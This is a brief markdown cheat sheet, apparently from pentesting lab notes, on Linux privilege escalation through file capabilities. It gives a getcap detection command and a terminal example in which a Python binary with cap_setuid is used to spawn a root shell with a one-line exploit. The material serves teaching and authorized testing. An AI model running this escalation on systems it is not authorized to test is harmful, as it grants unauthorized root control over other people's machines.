# Capabilities
Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.
#### Detection
```bash
getcap -r / 2>/dev/null
```

#### Exploitation (Example with Python)
```bash
TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
TCM@debian:~$ 

# Code to exploit
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Note :
if you have a binary that:
- is not owned by root
- has no SUID/SGID bits set
- has empty capabilities set (e.g.: getcap myelf returns myelf =ep)

then that binary will run as root.
